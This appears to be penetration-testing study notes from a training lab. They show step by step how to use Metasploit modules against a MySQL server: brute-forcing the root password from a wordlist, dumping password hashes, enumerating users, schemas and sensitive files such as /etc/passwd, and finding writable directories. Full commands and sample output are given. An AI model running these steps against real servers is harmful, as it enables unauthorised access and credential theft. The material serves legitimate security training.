# 🐬 Metasploit - MySQL Enumeration Modules

This file explains useful **Metasploit auxiliary modules** for MySQL service enumeration.  

---

## 🎯 Purpose

These modules help you:
- Detect MySQL server version  
- Brute-force MySQL credentials  
- Enumerate users, databases, and privileges  
- Dump password hashes  
- Find writable directories and files  

---

## 🗂️ MySQL Enumeration Modules Summary

| #  | Module              | What it Does                           |
|----|---------------------|----------------------------------------|
| 1  | mysql_version       | Detect MySQL server version            |
| 2  | mysql_login         | Brute-force login credentials          |
| 3  | mysql_enum          | Enumerate databases, users, privileges |
| 4  | mysql_sql           | Run custom SQL queries                 |
| 5  | mysql_file_enum     | Check for existence of files/directories |
| 6  | mysql_hashdump      | Dump password hashes                   |
| 7  | mysql_schemadump    | Dump database schema                   |
| 8  | mysql_writable_dirs | Check for writable directories         |

---

## 1. Detect MySQL Version

**Module**
```bash
auxiliary/scanner/mysql/mysql_version
```

**Command**
```bash
use auxiliary/scanner/mysql/mysql_version
set RHOSTS demo.ine.local
run
```

📸 **Sample Output:**
```
[+] 192.162.117.3:3306 - 192.162.117.3:3306 is running MySQL 5.5.61-0ubuntu0.14.04.1 (protocol 10)
[*] demo.ine.local:3306 - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

🔍 **Interpretation:**
- MySQL version detected: **5.5.61 on Ubuntu**  
- Useful for identifying known vulnerabilities related to this version  

---

## 2. MySQL Login Bruteforce

**Module**
```bash
auxiliary/scanner/mysql/mysql_login
```

**Command**
```bash
use auxiliary/scanner/mysql/mysql_login
set RHOSTS demo.ine.local
set USERNAME root
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
run
```

📸 **Sample Output:**
```
[+] 192.162.117.3:3306    - 192.162.117.3:3306 - Success: 'root:twinkle'
[*] demo.ine.local:3306   - Scanned 1 of 1 hosts (100% complete)
[*] demo.ine.local:3306   - Bruteforce completed, 1 credential was successful.
[*] demo.ine.local:3306   - You can open an MySQL session with these credentials and CreateSession set to true
[*] Auxiliary module execution completed
```

🔍 **Interpretation:**
- Found valid credentials: `root:twinkle`  
- Can now use these credentials to authenticate and enumerate further  

---

## 3. MySQL Enum

**Module**
```bash
auxiliary/admin/mysql/mysql_enum
```

**Command**
```bash
use auxiliary/admin/mysql/mysql_enum
set USERNAME root
set PASSWORD twinkle
set RHOSTS demo.ine.local
run
```

📸 **Sample Output:** (truncated)
```
[*] 192.162.117.3:3306 - Running MySQL Enumerator...
[*] 192.162.117.3:3306 - Enumerating Parameters
[*] 192.162.117.3:3306 -        MySQL Version: 5.5.61-0ubuntu0.14.04.1
[*] 192.162.117.3:3306 -        Compiled for the following OS: debian-linux-gnu
[*] 192.162.117.3:3306 -        Architecture: x86_64
...
[+] 192.162.117.3:3306 -                User: root Host: localhost Password Hash: *A0E23B565BACCE3E70D223915ABF2554B2540144
[+] 192.162.117.3:3306 -                User: debian-sys-maint Host: localhost Password Hash: *F4E71A0BE028B3688230B992EEAC70BC598FA723
[+] 192.162.117.3:3306 -                User: ultra Host: localhost Password Hash: *94BDCEBE19083CE2A1F959FD02F964C7AF4CFC29
...
```

🔍 **Interpretation:**
- Lists MySQL users, privileges, and password hashes  
- Shows server parameters (OS, architecture, logging, SSL, etc.)
- If **SSL Connection** is disabled, all MySQL traffic (queries, usernames, passwords) is sent in **cleartext** and can be sniffed on the network  
- If **SSL Connection** is enabled, traffic is **encrypted with TLS**, preventing eavesdropping  

---

## 4. Run Custom SQL Queries

**Module**
```bash
auxiliary/admin/mysql/mysql_sql
```

**Command**
```bash
use auxiliary/admin/mysql/mysql_sql
set USERNAME root
set PASSWORD twinkle
set RHOSTS demo.ine.local
run
```

📸 **Sample Output:**
```
[*] 192.162.117.3:3306 - Sending statement: 'select version()'...
[*] 192.162.117.3:3306 -  | 5.5.61-0ubuntu0.14.04.1 |
[*] Auxiliary module execution completed
```

🔍 **Interpretation:**
- Allows execution of custom SQL queries on the target  
- Useful for extracting sensitive data or testing permissions  

---

## 5. MySQL File Enumeration

**Module**
```bash
auxiliary/scanner/mysql/mysql_file_enum
```

**Command**
```bash
use auxiliary/scanner/mysql/mysql_file_enum
set USERNAME root
set PASSWORD twinkle
set RHOSTS demo.ine.local
set FILE_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
set VERBOSE true
run
```

📸 **Sample Output:** (truncated)
```
[+] 192.162.117.3:3306 - /tmp is a directory and exists
[+] 192.162.117.3:3306 - /etc/passwd is a file and exists
[!] 192.162.117.3:3306 - /etc/shadow does not exist
[+] 192.162.117.3:3306 - /root is a directory and exists
[+] 192.162.117.3:3306 - /home is a directory and exists
...
```

🔍 **Interpretation:**
- Confirms existence of sensitive files like `/etc/passwd`  
- Useful for privilege escalation and local enumeration  

---

## 6. Dump MySQL Password Hashes

**Module**
```bash
auxiliary/scanner/mysql/mysql_hashdump
```

**Command**
```bash
use auxiliary/scanner/mysql/mysql_hashdump
set USERNAME root
set PASSWORD twinkle
set RHOSTS demo.ine.local
run
```

📸 **Sample Output:**
```
[+] 192.162.117.3:3306 - Saving HashString as Loot: root:*A0E23B565BACCE3E70D223915ABF2554B2540144
[+] 192.162.117.3:3306 - Saving HashString as Loot: debian-sys-maint:*F4E71A0BE028B3688230B992EEAC70BC598FA723
[+] 192.162.117.3:3306 - Saving HashString as Loot: ultra:*94BDCEBE19083CE2A1F959FD02F964C7AF4CFC29
[+] 192.162.117.3:3306 - Saving HashString as Loot: guest:*17FD2DDCC01E0E66405FB1BA16F033188D18F646
...
```

🔍 **Interpretation:**
- Dumps all password hashes from MySQL user table  
- Hashes can be cracked offline for plaintext passwords  

---

## 7. Dump Database Schema

**Module**
```bash
auxiliary/scanner/mysql/mysql_schemadump
```

**Command**
```bash
use auxiliary/scanner/mysql/mysql_schemadump
set USERNAME root
set PASSWORD twinkle
set RHOSTS demo.ine.local
run
```

📸 **Sample Output:**
```
[+] 192.162.117.3:3306 - Schema stored in: /root/.msf4/loot/20250914223702_default_192.162.117.3_mysql_schema_680841.txt
[+] 192.162.117.3:3306 - MySQL Server Schema 
 Host: 192.162.117.3 
 Port: 3306 
 ====================

---
- DBName: upload
  Tables: []
- DBName: vendors
  Tables: []
- DBName: videos
  Tables: []
- DBName: warehouse
  Tables: []
```

🔍 **Interpretation:**
- Dumps schema of all databases  
- Helps to identify potential data storage locations  

---

## 8. Writable Directories Check

**Module**
```bash
auxiliary/scanner/mysql/mysql_writable_dirs
```

**Command**
```bash
use auxiliary/scanner/mysql/mysql_writable_dirs
set RHOSTS demo.ine.local
set USERNAME root
set PASSWORD twinkle
set DIR_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
run
```

📸 **Sample Output:**
```
[*] 192.162.117.3:3306 - Checking /tmp...
[+] 192.162.117.3:3306 - /tmp is writeable
[*] 192.162.117.3:3306 - Checking /root...
[+] 192.162.117.3:3306 - /root is writeable
[!] 192.162.117.3:3306 - Can't create/write to file '/etc/passwd/LzuBWjIb' (Errcode: 20)
...
```

🔍 **Interpretation:**
- Identifies writable directories on the target  
- Can be exploited for uploading files or privilege escalation  
